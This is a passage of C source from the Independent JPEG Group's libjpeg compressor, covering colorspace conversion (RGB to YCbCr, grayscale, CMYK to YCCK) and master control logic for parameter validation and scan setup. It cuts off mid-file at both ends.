    } else if ((cinfo->max_h_samp_factor % compptr->h_samp_factor) == 0 &&
	       (cinfo->max_v_samp_factor % compptr->v_samp_factor) == 0) {
      smoothok = FALSE;
      downsample->methods[ci] = int_downsample;
    } else
      ERREXIT(cinfo, JERR_FRACT_SAMPLE_NOTIMPL);
  }

#ifdef INPUT_SMOOTHING_SUPPORTED
  if (cinfo->smoothing_factor && !smoothok)
    TRACEMS(cinfo, 0, JTRC_SMOOTH_NOTIMPL);
#endif
}
/*
 * jccolor.c
 *
 * Copyright (C) 1991-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains input colorspace conversion routines.
 */


/* Private subobject */

typedef struct {
  struct jpeg_color_converter pub; /* public fields */

  /* Private state for RGB->YCC conversion */
  INT32 * rgb_ycc_tab;		/* => table for RGB to YCbCr conversion */
} my_color_converter;

typedef my_color_converter * my_cconvert_ptr;


/**************** RGB -> YCbCr conversion: most common case **************/

/*
 * YCbCr is defined per CCIR 601-1, except that Cb and Cr are
 * normalized to the range 0..MAXJSAMPLE rather than -0.5 .. 0.5.
 * The conversion equations to be implemented are therefore
 *	Y  =  0.29900 * R + 0.58700 * G + 0.11400 * B
 *	Cb = -0.16874 * R - 0.33126 * G + 0.50000 * B  + CENTERJSAMPLE
 *	Cr =  0.50000 * R - 0.41869 * G - 0.08131 * B  + CENTERJSAMPLE
 * (These numbers are derived from TIFF 6.0 section 21, dated 3-June-92.)
 * Note: older versions of the IJG code used a zero offset of MAXJSAMPLE/2,
 * rather than CENTERJSAMPLE, for Cb and Cr.  This gave equal positive and
 * negative swings for Cb/Cr, but meant that grayscale values (Cb=Cr=0)
 * were not represented exactly.  Now we sacrifice exact representation of
 * maximum red and maximum blue in order to get exact grayscales.
 *
 * To avoid floating-point arithmetic, we represent the fractional constants
 * as integers scaled up by 2^16 (about 4 digits precision); we have to divide
 * the products by 2^16, with appropriate rounding, to get the correct answer.
 *
 * For even more speed, we avoid doing any multiplications in the inner loop
 * by precalculating the constants times R,G,B for all possible values.
 * For 8-bit JSAMPLEs this is very reasonable (only 256 entries per table);
 * for 12-bit samples it is still acceptable.  It's not very reasonable for
 * 16-bit samples, but if you want lossless storage you shouldn't be changing
 * colorspace anyway.
 * The CENTERJSAMPLE offsets and the rounding fudge-factor of 0.5 are included
 * in the tables to save adding them separately in the inner loop.
 */

#define SCALEBITS	16	/* speediest right-shift on some machines */
#define CBCR_OFFSET	((INT32) CENTERJSAMPLE << SCALEBITS)
#define ONE_HALF	((INT32) 1 << (SCALEBITS-1))
#ifdef FIX
#undef FIX
#endif
#define FIX(x)		((INT32) ((x) * (1L<<SCALEBITS) + 0.5))

/* We allocate one big table and divide it up into eight parts, instead of
 * doing eight alloc_small requests.  This lets us use a single table base
 * address, which can be held in a in the inner loops on many
 * machines (more than can hold all eight addresses, anyway).
 */

#define R_Y_OFF		0			/* offset to R => Y section */
#define G_Y_OFF		(1*(MAXJSAMPLE+1))	/* offset to G => Y section */
#define B_Y_OFF		(2*(MAXJSAMPLE+1))	/* etc. */
#define R_CB_OFF	(3*(MAXJSAMPLE+1))
#define G_CB_OFF	(4*(MAXJSAMPLE+1))
#define B_CB_OFF	(5*(MAXJSAMPLE+1))
#define R_CR_OFF	B_CB_OFF		/* B=>Cb, R=>Cr are the same */
#define G_CR_OFF	(6*(MAXJSAMPLE+1))
#define B_CR_OFF	(7*(MAXJSAMPLE+1))
#define TABLE_SIZE	(8*(MAXJSAMPLE+1))


/*
 * Initialize for RGB->YCC colorspace conversion.
 */

METHODDEF(void)
rgb_ycc_start (j_compress_ptr cinfo)
{
  my_cconvert_ptr cconvert = (my_cconvert_ptr) cinfo->cconvert;
  INT32 * rgb_ycc_tab;
  INT32 i;

  /* Allocate and fill in the conversion tables. */
  cconvert->rgb_ycc_tab = rgb_ycc_tab = (INT32 *)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				(TABLE_SIZE * SIZEOF(INT32)));

  for (i = 0; i <= MAXJSAMPLE; i++) {
    rgb_ycc_tab[i+R_Y_OFF] = FIX(0.29900) * i;
    rgb_ycc_tab[i+G_Y_OFF] = FIX(0.58700) * i;
    rgb_ycc_tab[i+B_Y_OFF] = FIX(0.11400) * i     + ONE_HALF;
    rgb_ycc_tab[i+R_CB_OFF] = (-FIX(0.16874)) * i;
    rgb_ycc_tab[i+G_CB_OFF] = (-FIX(0.33126)) * i;
    /* We use a rounding fudge-factor of 0.5-epsilon for Cb and Cr.
     * This ensures that the maximum output will round to MAXJSAMPLE
     * not MAXJSAMPLE+1, and thus that we don't have to range-limit.
     */
    rgb_ycc_tab[i+B_CB_OFF] = FIX(0.50000) * i    + CBCR_OFFSET + ONE_HALF-1;
/*  B=>Cb and R=>Cr tables are the same
    rgb_ycc_tab[i+R_CR_OFF] = FIX(0.50000) * i    + CBCR_OFFSET + ONE_HALF-1;
*/
    rgb_ycc_tab[i+G_CR_OFF] = (-FIX(0.41869)) * i;
    rgb_ycc_tab[i+B_CR_OFF] = (-FIX(0.08131)) * i;
  }
}


/*
 * Convert some rows of samples to the JPEG colorspace.
 *
 * Note that we change from the application's interleaved-pixel format
 * to our internal noninterleaved, one-plane-per-component format.
 * The input buffer is therefore three times as wide as the output buffer.
 *
 * A starting row offset is provided only for the output buffer.  The caller
 * can easily adjust the passed input_buf value to accommodate any row
 * offset required on that side.
 */

METHODDEF(void)
rgb_ycc_convert (j_compress_ptr cinfo,
		 JSAMPARRAY input_buf, JSAMPIMAGE output_buf,
		 JDIMENSION output_row, int num_rows)
{
  my_cconvert_ptr cconvert = (my_cconvert_ptr) cinfo->cconvert;
  int r, g, b;
  INT32 * ctab = cconvert->rgb_ycc_tab;
  JSAMPROW inptr;
  JSAMPROW outptr0, outptr1, outptr2;
  JDIMENSION col;
  JDIMENSION num_cols = cinfo->image_width;

  while (--num_rows >= 0) {
    inptr = *input_buf++;
    outptr0 = output_buf[0][output_row];
    outptr1 = output_buf[1][output_row];
    outptr2 = output_buf[2][output_row];
    output_row++;
    for (col = 0; col < num_cols; col++) {
      r = GETJSAMPLE(inptr[RGB_RED]);
      g = GETJSAMPLE(inptr[RGB_GREEN]);
      b = GETJSAMPLE(inptr[RGB_BLUE]);
      inptr += RGB_PIXELSIZE;
      /* If the inputs are 0..MAXJSAMPLE, the outputs of these equations
       * must be too; we do not need an explicit range-limiting operation.
       * Hence the value being shifted is never negative, and we don't
       * need the general RIGHT_SHIFT macro.
       */
      /* Y */
      outptr0[col] = (JSAMPLE)
		((ctab[r+R_Y_OFF] + ctab[g+G_Y_OFF] + ctab[b+B_Y_OFF])
		 >> SCALEBITS);
      /* Cb */
      outptr1[col] = (JSAMPLE)
		((ctab[r+R_CB_OFF] + ctab[g+G_CB_OFF] + ctab[b+B_CB_OFF])
		 >> SCALEBITS);
      /* Cr */
      outptr2[col] = (JSAMPLE)
		((ctab[r+R_CR_OFF] + ctab[g+G_CR_OFF] + ctab[b+B_CR_OFF])
		 >> SCALEBITS);
    }
  }
}


/**************** Cases other than RGB -> YCbCr **************/


/*
 * Convert some rows of samples to the JPEG colorspace.
 * This version handles RGB->grayscale conversion, which is the same
 * as the RGB->Y portion of RGB->YCbCr.
 * We assume rgb_ycc_start has been called (we only use the Y tables).
 */

METHODDEF(void)
rgb_gray_convert (j_compress_ptr cinfo,
		  JSAMPARRAY input_buf, JSAMPIMAGE output_buf,
		  JDIMENSION output_row, int num_rows)
{
  my_cconvert_ptr cconvert = (my_cconvert_ptr) cinfo->cconvert;
  int r, g, b;
  INT32 * ctab = cconvert->rgb_ycc_tab;
  JSAMPROW inptr;
  JSAMPROW outptr;
  JDIMENSION col;
  JDIMENSION num_cols = cinfo->image_width;

  while (--num_rows >= 0) {
    inptr = *input_buf++;
    outptr = output_buf[0][output_row];
    output_row++;
    for (col = 0; col < num_cols; col++) {
      r = GETJSAMPLE(inptr[RGB_RED]);
      g = GETJSAMPLE(inptr[RGB_GREEN]);
      b = GETJSAMPLE(inptr[RGB_BLUE]);
      inptr += RGB_PIXELSIZE;
      /* Y */
      outptr[col] = (JSAMPLE)
		((ctab[r+R_Y_OFF] + ctab[g+G_Y_OFF] + ctab[b+B_Y_OFF])
		 >> SCALEBITS);
    }
  }
}


/*
 * Convert some rows of samples to the JPEG colorspace.
 * This version handles Adobe-style CMYK->YCCK conversion,
 * where we convert R=1-C, G=1-M, and B=1-Y to YCbCr using the same
 * conversion as above, while passing K (black) unchanged.
 * We assume rgb_ycc_start has been called.
 */

METHODDEF(void)
cmyk_ycck_convert (j_compress_ptr cinfo,
		   JSAMPARRAY input_buf, JSAMPIMAGE output_buf,
		   JDIMENSION output_row, int num_rows)
{
  my_cconvert_ptr cconvert = (my_cconvert_ptr) cinfo->cconvert;
  int r, g, b;
  INT32 * ctab = cconvert->rgb_ycc_tab;
  JSAMPROW inptr;
  JSAMPROW outptr0, outptr1, outptr2, outptr3;
  JDIMENSION col;
  JDIMENSION num_cols = cinfo->image_width;

  while (--num_rows >= 0) {
    inptr = *input_buf++;
    outptr0 = output_buf[0][output_row];
    outptr1 = output_buf[1][output_row];
    outptr2 = output_buf[2][output_row];
    outptr3 = output_buf[3][output_row];
    output_row++;
    for (col = 0; col < num_cols; col++) {
      r = MAXJSAMPLE - GETJSAMPLE(inptr[0]);
      g = MAXJSAMPLE - GETJSAMPLE(inptr[1]);
      b = MAXJSAMPLE - GETJSAMPLE(inptr[2]);
      /* K passes through as-is */
      outptr3[col] = inptr[3];	/* don't need GETJSAMPLE here */
      inptr += 4;
      /* If the inputs are 0..MAXJSAMPLE, the outputs of these equations
       * must be too; we do not need an explicit range-limiting operation.
       * Hence the value being shifted is never negative, and we don't
       * need the general RIGHT_SHIFT macro.
       */
      /* Y */
      outptr0[col] = (JSAMPLE)
		((ctab[r+R_Y_OFF] + ctab[g+G_Y_OFF] + ctab[b+B_Y_OFF])
		 >> SCALEBITS);
      /* Cb */
      outptr1[col] = (JSAMPLE)
		((ctab[r+R_CB_OFF] + ctab[g+G_CB_OFF] + ctab[b+B_CB_OFF])
		 >> SCALEBITS);
      /* Cr */
      outptr2[col] = (JSAMPLE)
		((ctab[r+R_CR_OFF] + ctab[g+G_CR_OFF] + ctab[b+B_CR_OFF])
		 >> SCALEBITS);
    }
  }
}


/*
 * Convert some rows of samples to the JPEG colorspace.
 * This version handles grayscale output with no conversion.
 * The source can be either plain grayscale or YCbCr (since Y == gray).
 */

METHODDEF(void)
grayscale_convert (j_compress_ptr cinfo,
		   JSAMPARRAY input_buf, JSAMPIMAGE output_buf,
		   JDIMENSION output_row, int num_rows)
{
  JSAMPROW inptr;
  JSAMPROW outptr;
  JDIMENSION col;
  JDIMENSION num_cols = cinfo->image_width;
  int instride = cinfo->input_components;

  while (--num_rows >= 0) {
    inptr = *input_buf++;
    outptr = output_buf[0][output_row];
    output_row++;
    for (col = 0; col < num_cols; col++) {
      outptr[col] = inptr[0];	/* don't need GETJSAMPLE() here */
      inptr += instride;
    }
  }
}


/*
 * Convert some rows of samples to the JPEG colorspace.
 * This version handles multi-component colorspaces without conversion.
 * We assume input_components == num_components.
 */

METHODDEF(void)
null_convert (j_compress_ptr cinfo,
	      JSAMPARRAY input_buf, JSAMPIMAGE output_buf,
	      JDIMENSION output_row, int num_rows)
{
  JSAMPROW inptr;
  JSAMPROW outptr;
  JDIMENSION col;
  int ci;
  int nc = cinfo->num_components;
  JDIMENSION num_cols = cinfo->image_width;

  while (--num_rows >= 0) {
    /* It seems fastest to make a separate pass for each component. */
    for (ci = 0; ci < nc; ci++) {
      inptr = *input_buf;
      outptr = output_buf[ci][output_row];
      for (col = 0; col < num_cols; col++) {
	outptr[col] = inptr[ci]; /* don't need GETJSAMPLE() here */
	inptr += nc;
      }
    }
    input_buf++;
    output_row++;
  }
}


/*
 * Empty method for start_pass.
 */

METHODDEF(void)
null_method (j_compress_ptr cinfo)
{
  /* no work needed */
}


/*
 * Module initialization routine for input colorspace conversion.
 */

GLOBAL(void)
jinit_color_converter (j_compress_ptr cinfo)
{
  my_cconvert_ptr cconvert;

  cconvert = (my_cconvert_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(my_color_converter));
  cinfo->cconvert = (struct jpeg_color_converter *) cconvert;
  /* set start_pass to null method until we find out differently */
  cconvert->pub.start_pass = null_method;

  /* Make sure input_components agrees with in_color_space */
  switch (cinfo->in_color_space) {
  case JCS_GRAYSCALE:
    if (cinfo->input_components != 1)
      ERREXIT(cinfo, JERR_BAD_IN_COLORSPACE);
    break;

  case JCS_RGB:
#if RGB_PIXELSIZE != 3
    if (cinfo->input_components != RGB_PIXELSIZE)
      ERREXIT(cinfo, JERR_BAD_IN_COLORSPACE);
    break;
#endif /* else share code with YCbCr */

  case JCS_YCbCr:
    if (cinfo->input_components != 3)
      ERREXIT(cinfo, JERR_BAD_IN_COLORSPACE);
    break;

  case JCS_CMYK:
  case JCS_YCCK:
    if (cinfo->input_components != 4)
      ERREXIT(cinfo, JERR_BAD_IN_COLORSPACE);
    break;

  default:			/* JCS_UNKNOWN can be anything */
    if (cinfo->input_components < 1)
      ERREXIT(cinfo, JERR_BAD_IN_COLORSPACE);
    break;
  }

  /* Check num_components, set conversion method based on requested space */
  switch (cinfo->jpeg_color_space) {
  case JCS_GRAYSCALE:
    if (cinfo->num_components != 1)
      ERREXIT(cinfo, JERR_BAD_J_COLORSPACE);
    if (cinfo->in_color_space == JCS_GRAYSCALE)
      cconvert->pub.color_convert = grayscale_convert;
    else if (cinfo->in_color_space == JCS_RGB) {
      cconvert->pub.start_pass = rgb_ycc_start;
      cconvert->pub.color_convert = rgb_gray_convert;
    } else if (cinfo->in_color_space == JCS_YCbCr)
      cconvert->pub.color_convert = grayscale_convert;
    else
      ERREXIT(cinfo, JERR_CONVERSION_NOTIMPL);
    break;

  case JCS_RGB:
    if (cinfo->num_components != 3)
      ERREXIT(cinfo, JERR_BAD_J_COLORSPACE);
    if (cinfo->in_color_space == JCS_RGB && RGB_PIXELSIZE == 3)
      cconvert->pub.color_convert = null_convert;
    else
      ERREXIT(cinfo, JERR_CONVERSION_NOTIMPL);
    break;

  case JCS_YCbCr:
    if (cinfo->num_components != 3)
      ERREXIT(cinfo, JERR_BAD_J_COLORSPACE);
    if (cinfo->in_color_space == JCS_RGB) {
      cconvert->pub.start_pass = rgb_ycc_start;
      cconvert->pub.color_convert = rgb_ycc_convert;
    } else if (cinfo->in_color_space == JCS_YCbCr)
      cconvert->pub.color_convert = null_convert;
    else
      ERREXIT(cinfo, JERR_CONVERSION_NOTIMPL);
    break;

  case JCS_CMYK:
    if (cinfo->num_components != 4)
      ERREXIT(cinfo, JERR_BAD_J_COLORSPACE);
    if (cinfo->in_color_space == JCS_CMYK)
      cconvert->pub.color_convert = null_convert;
    else
      ERREXIT(cinfo, JERR_CONVERSION_NOTIMPL);
    break;

  case JCS_YCCK:
    if (cinfo->num_components != 4)
      ERREXIT(cinfo, JERR_BAD_J_COLORSPACE);
    if (cinfo->in_color_space == JCS_CMYK) {
      cconvert->pub.start_pass = rgb_ycc_start;
      cconvert->pub.color_convert = cmyk_ycck_convert;
    } else if (cinfo->in_color_space == JCS_YCCK)
      cconvert->pub.color_convert = null_convert;
    else
      ERREXIT(cinfo, JERR_CONVERSION_NOTIMPL);
    break;

  default:			/* allow null conversion of JCS_UNKNOWN */
    if (cinfo->jpeg_color_space != cinfo->in_color_space ||
	cinfo->num_components != cinfo->input_components)
      ERREXIT(cinfo, JERR_CONVERSION_NOTIMPL);
    cconvert->pub.color_convert = null_convert;
    break;
  }
}
/*
 * jcmaster.c
 *
 * Copyright (C) 1991-1997, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains master control logic for the JPEG compressor.
 * These routines are concerned with parameter validation, initial setup,
 * and inter-pass control (determining the number of passes and the work 
 * to be done in each pass).
 */


/* Private state */

typedef enum {
	main_pass,		/* input data, also do first output step */
	huff_opt_pass,		/* Huffman code optimization pass */
	output_pass		/* data output pass */
} c_pass_type;

typedef struct {
  struct jpeg_comp_master pub;	/* public fields */

  c_pass_type pass_type;	/* the type of the current pass */

  int pass_number;		/* # of passes completed */
  int total_passes;		/* total # of passes needed */

  int scan_number;		/* current index in scan_info[] */
} my_comp_master;

typedef my_comp_master * my_master_ptr;


/*
 * Support routines that do various essential calculations.
 */

LOCAL(void)
initial_setup (j_compress_ptr cinfo)
/* Do computations that are needed before master selection phase */
{
  int ci;
  jpeg_component_info *compptr;
  long samplesperrow;
  JDIMENSION jd_samplesperrow;

  /* Sanity check on image dimensions */
  if (cinfo->image_height <= 0 || cinfo->image_width <= 0
      || cinfo->num_components <= 0 || cinfo->input_components <= 0)
    ERREXIT(cinfo, JERR_EMPTY_IMAGE);

  /* Make sure image isn't bigger than I can handle */
  if ((long) cinfo->image_height > (long) JPEG_MAX_DIMENSION ||
      (long) cinfo->image_width > (long) JPEG_MAX_DIMENSION)
    ERREXIT1(cinfo, JERR_IMAGE_TOO_BIG, (unsigned int) JPEG_MAX_DIMENSION);

  /* Width of an input scanline must be representable as JDIMENSION. */
  samplesperrow = (long) cinfo->image_width * (long) cinfo->input_components;
  jd_samplesperrow = (JDIMENSION) samplesperrow;
  if ((long) jd_samplesperrow != samplesperrow)
    ERREXIT(cinfo, JERR_WIDTH_OVERFLOW);

  /* For now, precision must match compiled-in value... */
  if (cinfo->data_precision != BITS_IN_JSAMPLE)
    ERREXIT1(cinfo, JERR_BAD_PRECISION, cinfo->data_precision);

  /* Check that number of components won't exceed internal array sizes */
  if (cinfo->num_components > MAX_COMPONENTS)
    ERREXIT2(cinfo, JERR_COMPONENT_COUNT, cinfo->num_components,
	     MAX_COMPONENTS);

  /* Compute maximum sampling factors; check factor validity */
  cinfo->max_h_samp_factor = 1;
  cinfo->max_v_samp_factor = 1;
  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    if (compptr->h_samp_factor<=0 || compptr->h_samp_factor>MAX_SAMP_FACTOR ||
	compptr->v_samp_factor<=0 || compptr->v_samp_factor>MAX_SAMP_FACTOR)
      ERREXIT(cinfo, JERR_BAD_SAMPLING);
    cinfo->max_h_samp_factor = MAX(cinfo->max_h_samp_factor,
				   compptr->h_samp_factor);
    cinfo->max_v_samp_factor = MAX(cinfo->max_v_samp_factor,
				   compptr->v_samp_factor);
  }

  /* Compute dimensions of components */
  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    /* Fill in the correct component_index value; don't rely on application */
    compptr->component_index = ci;
    /* For compression, we never do DCT scaling. */
    compptr->DCT_scaled_size = DCTSIZE;
    /* Size in DCT blocks */
    compptr->width_in_blocks = (JDIMENSION)
      jdiv_round_up((long) cinfo->image_width * (long) compptr->h_samp_factor,
		    (long) (cinfo->max_h_samp_factor * DCTSIZE));
    compptr->height_in_blocks = (JDIMENSION)
      jdiv_round_up((long) cinfo->image_height * (long) compptr->v_samp_factor,
		    (long) (cinfo->max_v_samp_factor * DCTSIZE));
    /* Size in samples */
    compptr->downsampled_width = (JDIMENSION)
      jdiv_round_up((long) cinfo->image_width * (long) compptr->h_samp_factor,
		    (long) cinfo->max_h_samp_factor);
    compptr->downsampled_height = (JDIMENSION)
      jdiv_round_up((long) cinfo->image_height * (long) compptr->v_samp_factor,
		    (long) cinfo->max_v_samp_factor);
    /* Mark component needed (this flag isn't actually used for compression) */
    compptr->component_needed = TRUE;
  }

  /* Compute number of fully interleaved MCU rows (number of times that
   * main controller will call coefficient controller).
   */
  cinfo->total_iMCU_rows = (JDIMENSION)
    jdiv_round_up((long) cinfo->image_height,
		  (long) (cinfo->max_v_samp_factor*DCTSIZE));
}


#ifdef C_MULTISCAN_FILES_SUPPORTED

LOCAL(void)
validate_script (j_compress_ptr cinfo)
/* Verify that the scan script in cinfo->scan_info[] is valid; also
 * determine whether it uses progressive JPEG, and set cinfo->progressive_mode.
 */
{
  const jpeg_scan_info * scanptr;
  int scanno, ncomps, ci, coefi, thisi;
  int Ss, Se, Ah, Al;
  boolean component_sent[MAX_COMPONENTS];
#ifdef C_PROGRESSIVE_SUPPORTED
  int * last_bitpos_ptr;
  int last_bitpos[MAX_COMPONENTS][DCTSIZE2];
  /* -1 until that coefficient has been seen; then last Al for it */
#endif

  if (cinfo->num_scans <= 0)
    ERREXIT1(cinfo, JERR_BAD_SCAN_SCRIPT, 0);

  /* For sequential JPEG, all scans must have Ss=0, Se=DCTSIZE2-1;
   * for progressive JPEG, no scan can have this.
   */
  scanptr = cinfo->scan_info;
  if (scanptr->Ss != 0 || scanptr->Se != DCTSIZE2-1) {
#ifdef C_PROGRESSIVE_SUPPORTED
    cinfo->progressive_mode = TRUE;
    last_bitpos_ptr = & last_bitpos[0][0];
    for (ci = 0; ci < cinfo->num_components; ci++) 
      for (coefi = 0; coefi < DCTSIZE2; coefi++)
	*last_bitpos_ptr++ = -1;
#else
    ERREXIT(cinfo, JERR_NOT_COMPILED);
#endif
  } else {
    cinfo->progressive_mode = FALSE;
    for (ci = 0; ci < cinfo->num_components; ci++) 
      component_sent[ci] = FALSE;
  }

  for (scanno = 1; scanno <= cinfo->num_scans; scanptr++, scanno++) {
    /* Validate component indexes */
    ncomps = scanptr->comps_in_scan;
    if (ncomps <= 0 || ncomps > MAX_COMPS_IN_SCAN)
      ERREXIT2(cinfo, JERR_COMPONENT_COUNT, ncomps, MAX_COMPS_IN_SCAN);
    for (ci = 0; ci < ncomps; ci++) {
      thisi = scanptr->component_index[ci];
      if (thisi < 0 || thisi >= cinfo->num_components)
	ERREXIT1(cinfo, JERR_BAD_SCAN_SCRIPT, scanno);
      /* Components must appear in SOF order within each scan */
      if (ci > 0 && thisi <= scanptr->component_index[ci-1])
	ERREXIT1(cinfo, JERR_BAD_SCAN_SCRIPT, scanno);
    }
    /* Validate progression parameters */
    Ss = scanptr->Ss;
    Se = scanptr->Se;
    Ah = scanptr->Ah;
    Al = scanptr->Al;
    if (cinfo->progressive_mode) {
#ifdef C_PROGRESSIVE_SUPPORTED
      /* The JPEG spec simply gives the ranges 0..13 for Ah and Al, but that
       * seems wrong: the upper bound ought to depend on data precision.
       * Perhaps they really meant 0..N+1 for N-bit precision.
       * Here we allow 0..10 for 8-bit data; Al larger than 10 results in
       * out-of-range reconstructed DC values during the first DC scan,
       * which might cause problems for some decoders.
       */
#if BITS_IN_JSAMPLE == 8
#define MAX_AH_AL 10
#else
#define MAX_AH_AL 13
#endif
      if (Ss < 0 || Ss >= DCTSIZE2 || Se < Ss || Se >= DCTSIZE2 ||
	  Ah < 0 || Ah > MAX_AH_AL || Al < 0 || Al > MAX_AH_AL)
	ERREXIT1(cinfo, JERR_BAD_PROG_SCRIPT, scanno);
      if (Ss == 0) {
	if (Se != 0)		/* DC and AC together not OK */
	  ERREXIT1(cinfo, JERR_BAD_PROG_SCRIPT, scanno);
      } else {
	if (ncomps != 1)	/* AC scans must be for only one component */
	  ERREXIT1(cinfo, JERR_BAD_PROG_SCRIPT, scanno);
      }
      for (ci = 0; ci < ncomps; ci++) {
	last_bitpos_ptr = & last_bitpos[scanptr->component_index[ci]][0];
	if (Ss != 0 && last_bitpos_ptr[0] < 0) /* AC without prior DC scan */
	  ERREXIT1(cinfo, JERR_BAD_PROG_SCRIPT, scanno);
	for (coefi = Ss; coefi <= Se; coefi++) {
	  if (last_bitpos_ptr[coefi] < 0) {
	    /* first scan of this coefficient */
	    if (Ah != 0)
	      ERREXIT1(cinfo, JERR_BAD_PROG_SCRIPT, scanno);
	  } else {
	    /* not first scan */
	    if (Ah != last_bitpos_ptr[coefi] || Al != Ah-1)
	      ERREXIT1(cinfo, JERR_BAD_PROG_SCRIPT, scanno);
	  }
	  last_bitpos_ptr[coefi] = Al;
	}
      }
#endif
    } else {
      /* For sequential JPEG, all progression parameters must be these: */
      if (Ss != 0 || Se != DCTSIZE2-1 || Ah != 0 || Al != 0)
	ERREXIT1(cinfo, JERR_BAD_PROG_SCRIPT, scanno);
      /* Make sure components are not sent twice */
      for (ci = 0; ci < ncomps; ci++) {
	thisi = scanptr->component_index[ci];
	if (component_sent[thisi])
	  ERREXIT1(cinfo, JERR_BAD_SCAN_SCRIPT, scanno);
	component_sent[thisi] = TRUE;
      }
    }
  }

  /* Now verify that everything got sent. */
  if (cinfo->progressive_mode) {
#ifdef C_PROGRESSIVE_SUPPORTED
    /* For progressive mode, we only check that at least some DC data
     * got sent for each component; the spec does not require that all bits
     * of all coefficients be transmitted.  Would it be wiser to enforce
     * transmission of all coefficient bits??
     */
    for (ci = 0; ci < cinfo->num_components; ci++) {
      if (last_bitpos[ci][0] < 0)
	ERREXIT(cinfo, JERR_MISSING_DATA);
    }
#endif
  } else {
    for (ci = 0; ci < cinfo->num_components; ci++) {
      if (! component_sent[ci])
	ERREXIT(cinfo, JERR_MISSING_DATA);
    }
  }
}

#endif /* C_MULTISCAN_FILES_SUPPORTED */


LOCAL(void)
select_scan_parameters (j_compress_ptr cinfo)
/* Set up the scan parameters for the current scan */
{
  int ci;

#ifdef C_MULTISCAN_FILES_SUPPORTED
  if (cinfo->scan_info != NULL) {
    /* Prepare for current scan --- the script is already validated */
    my_master_ptr master = (my_master_ptr) cinfo->master;
    const jpeg_scan_info * scanptr = cinfo->scan_info + master->scan_number;

    cinfo->comps_in_scan = scanptr->comps_in_scan;
    for (ci = 0; ci < scanptr->comps_in_scan; ci++) {
      cinfo->cur_comp_info[ci] =
	&cinfo->comp_info[scanptr->component_index[ci]];
    }
    cinfo->Ss = scanptr->Ss;
    cinfo->Se = scanptr->Se;
    cinfo->Ah = scanptr->Ah;
    cinfo->Al = scanptr->Al;
  }
  else
#endif
  {
    /* Prepare for single sequential-JPEG scan containing all components */
    if (cinfo->num_components > MAX_COMPS_IN_SCAN)
      ERREXIT2(cinfo, JERR_COMPONENT_COUNT, cinfo->num_components,
	       MAX_COMPS_IN_SCAN);
    cinfo->comps_in_scan = cinfo->num_components;
    for (ci = 0; ci < cinfo->num_components; ci++) {
      cinfo->cur_comp_info[ci] = &cinfo->comp_info[ci];
    }
    cinfo->Ss = 0;
    cinfo->Se = DCTSIZE2-1;
    cinfo->Ah = 0;
    cinfo->Al = 0;
  }
}


LOCAL(void)
per_scan_setup (j_compress_ptr cinfo)
/* Do computations that are needed before processing a JPEG scan */
/* cinfo->comps_in_scan and cinfo->cur_comp_info[] are already set */
{
  int ci, mcublks, tmp;
  jpeg_component_info *compptr;
  
  if (cinfo->comps_in_scan == 1) {
    
    /* Noninterleaved (single-component) scan */
    compptr = cinfo->cur_comp_info[0];
    
    /* Overall image size in MCUs */
    cinfo->MCUs_per_row = compptr->width_in_blocks;
    cinfo->MCU_rows_in_scan = compptr->height_in_blocks;
    
    /* For noninterleaved scan, always one block per MCU */
    compptr->MCU_width = 1;
    compptr->MCU_height = 1;
    compptr->MCU_blocks = 1;
    compptr->MCU_sample_width = DCTSIZE;
    compptr->last_col_width = 1;
    /* For noninterleaved scans, it is convenient to define last_row_height
     * as the number of block rows present in the last iMCU row.
     */
    tmp = (int) (compptr->height_in_blocks % compptr->v_samp_factor);
    if (tmp == 0) tmp = compptr->v_samp_factor;
    compptr->last_row_height = tmp;
    
    /* Prepare array describing MCU composition */
    cinfo->blocks_in_MCU = 1;
    cinfo->MCU_membership[0] = 0;
    
  } else {
    
    /* Interleaved (multi-component) scan */
    if (cinfo->comps_in_scan <= 0 || cinfo->comps_in_scan > MAX_COMPS_IN_SCAN)
      ERREXIT2(cinfo, JERR_COMPONENT_COUNT, cinfo->comps_in_scan,
	       MAX_COMPS_IN_SCAN);
    
    /* Overall image size in MCUs */
    cinfo->MCUs_per_row = (JDIMENSION)
      jdiv_round_up((long) cinfo->image_width,
		    (long) (cinfo->max_h_samp_factor*DCTSIZE));
    cinfo->MCU_rows_in_scan = (JDIMENSION)
      jdiv_round_up((long) cinfo->image_height,
		    (long) (cinfo->max_v_samp_factor*DCTSIZE));
    
    cinfo->blocks_in_MCU = 0;
    
    for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
      compptr = cinfo->cur_comp_info[ci];
      /* Sampling factors give # of blocks of component in each MCU */
      compptr->MCU_width = compptr->h_samp_factor;
      compptr->MCU_height = compptr->v_samp_factor;
      compptr->MCU_blocks = compptr->MCU_width * compptr->MCU_height;
      compptr->MCU_sample_width = compptr->MCU_width * DCTSIZE;
      /* Figure number of non-dummy blocks in last MCU column & row */
      tmp = (int) (compptr->width_in_blocks % compptr->MCU_width);
      if (tmp == 0) tmp = compptr->MCU_width;
      compptr->last_col_width = tmp;
      tmp = (int) (compptr->height_in_blocks % compptr->MCU_height);
      if (tmp == 0) tmp = compptr->MCU_height;
      compptr->last_row_height = tmp;
      /* Prepare array describing MCU composition */
      mcublks = compptr->MCU_blocks;
      if (cinfo->blocks_in_MCU + mcublks > C_MAX_BLOCKS_IN_MCU)
	ERREXIT(cinfo, JERR_BAD_MCU_SIZE);
      while (mcublks-- > 0) {
	cinfo->MCU_membership[cinfo->blocks_in_MCU++] = ci;
      }
    }
    
  }

  /* Convert restart specified in rows to actual MCU count. */
  /* Note that count must fit in 16 bits, so we provide limiting. */
  if (cinfo->restart_in_rows > 0) {
    long nominal = (long) cinfo->restart_in_rows * (long) cinfo->MCUs_per_row;
    cinfo->restart_interval = (unsigned int) MIN(nominal, 65535L);
  }
}


/*
 * Per-pass setup.
 * This is called at the beginning of each pass.  We determine which modules
 * will be active during this pass and give them appropriate start_pass calls.
 * We also set is_last_pass to indicate whether any more passes will be
 * required.
 */

METHODDEF(void)
